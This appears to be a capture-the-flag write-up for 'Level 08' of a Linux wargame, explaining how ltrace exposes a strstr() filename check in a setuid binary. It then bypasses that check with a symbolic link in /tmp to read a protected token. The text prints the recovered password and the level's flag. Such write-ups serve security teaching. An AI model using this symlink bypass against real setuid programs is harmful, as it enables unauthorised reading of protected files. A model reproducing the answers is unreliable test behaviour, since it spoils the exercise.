# Level 08

## Resolution

As `level08`, running `ls` gives us a binary called `level08` and a file named `token` which can't be read inside our home folder. Using the binary gives us:

```shell
  $> ./level08
  ./level08 [file to read]
  $> ./level08 token
  You may not access 'token'
```

We want to know what it actually does, so using `ltrace` once again we can see the following.

```shell
  $> ltrace ./level08 token 
  __libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
  strstr("token", "token")                           = "token"
  printf("You may not access '%s'\n", "token"You may not access 'token'
  )       = 27
  exit(1 <unfinished ...>
  +++ exited (status 1) +++
```

> It appears that if [`strstr()`](https://linux.die.net/man/3/strstr) returns something we can't read the file. So we must avoid using `"token"` in the path of the file we want to open.

Creating a **symbolic link** with a different name would help us bypass the read permission on the file and the `strstr()` check. Finaly if we use `ls -l` to get more infos...

```shell
  $> ls -l
  total 16
  -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
  -rw-------  1 flag08 flag08    26 Mar  5  2016 token 
```

User `flag08` owns both files so once redirected to the `token` file via symbolic link, it will open the file without any problems.

```shell
  $> ln -s /home/user/level08/token /tmp/password
  $> ./level08 /tmp/password
  quif5eloekouj29ke0vouxean
```

This looks like a password, use it to log as `flag08` and run `getflag` to finish this level.

```shell
  $> su flag08
  Password: quif5eloekouj29ke0vouxean
  $> getflag
  Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

So, `25749xKZ8L7DkSCwJkT9dyv6f` is the flag for this level.

## Ressources

- [Symbolic link vulnerabilities](https://lettieri.iet.unipi.it/hacking/symlinks.pdf)